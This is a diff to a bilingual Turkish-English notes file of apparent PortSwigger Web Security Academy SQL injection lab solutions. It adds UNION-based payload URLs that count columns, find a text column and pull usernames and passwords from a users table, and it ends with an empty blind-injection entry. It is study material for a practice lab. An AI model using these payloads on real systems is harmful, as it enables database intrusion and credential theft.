@@ -76,4 +76,31 @@ https://$YOURLABSID.web-security-academy.net/filter?category=Lifestyle%27+UNION+
 #      SQL enjeksiyon UNION saldırısı, metin içeren bir sütun bulma      #
 ##########################################################################
 
-8--> 
+8--> Önce sütün sayısını bulup sonra hangi sütünda değer gösterdiğini kontrol ediyoruz.
+https://$YOURLABSID.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,NULL,NULL--
+https://$YOURLABSID.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,%27NUB9LR%27,NULL--
+
+###########################################################################
+#      SQL injection UNION attack, retrieving data from other tables      #
+#      SQL enjeksiyon UNION saldırısı, diğer tablolardan veri alma        #
+###########################################################################
+
+9--> 
+öncelikle sütun sayısını buluyoruz => https://$YOURLABSID.web-security-academy.net/filter?category=Lifestyle%27+UNION+SELECT+%27abc%27,%27def%27--
+sonra username ve password bilgilerini users tablosundan çekiyoruz => https://$YOURLABSID.web-security-academy.net/filter?category=Lifestyle%27+UNION+SELECT+username,+password+FROM+users--
+
+#######################################################################################
+#      SQL injection UNION attack, retrieving multiple values in a single column      #
+#      SQL enjeksiyon UNION saldırısı, tek bir sütunda birden fazla değer alma        #
+#######################################################################################
+
+10--> 
+sütun sayısı ve hangi sütunun veri döndürdüğünü deniyoruz => https://$YOURLABSID.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,%27abc%27--
+users adlı tablodan username ve password bilgilerini çekiyoruz => https://$YOURLABSID.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,username||%27~%27||password+FROM+users--
+
+############################################################
+#      Blind SQL injection with conditional responses      #
+#      Koşullu yanıtlarla kör SQL enjeksiyonu              #
+############################################################
+
+11--> 
